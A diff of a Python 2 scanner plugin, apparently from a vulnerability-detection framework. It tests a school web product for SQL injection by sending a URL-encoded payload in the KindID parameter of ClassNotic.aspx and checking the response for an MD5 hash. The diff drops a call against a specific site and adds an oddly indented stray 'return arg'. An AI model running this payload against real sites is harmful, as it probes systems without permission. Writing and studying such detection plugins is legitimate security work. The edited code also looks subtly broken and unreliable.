@@ -4,12 +4,9 @@
 #ref http://www.wooyun.org/bugs/wooyun-2010-069224
 #ref http://www.wooyun.org/bugs/wooyun-2010-076636
 #ref http://www.wooyun.org/bugs/wooyun-2010-076538
-
 def assign(service, arg):
     if service == "xinzuobiao":
         return True, arg
-
-
 def audit(arg):
     import urllib2
     payloads = ['DPMA/FWeb/SchoolWeb/Class/ClassNotic.aspx?ClsID=4012&KindID=%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--',\
@@ -25,6 +22,7 @@ def audit(arg):
         if '81dc9bdb52d04dc20036dbd8313ed055' in res:
             security_hole(url)
                         
-if __name__ == '__main__':
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('xinzuobiao', 'http://www.azxx.net/')[1])
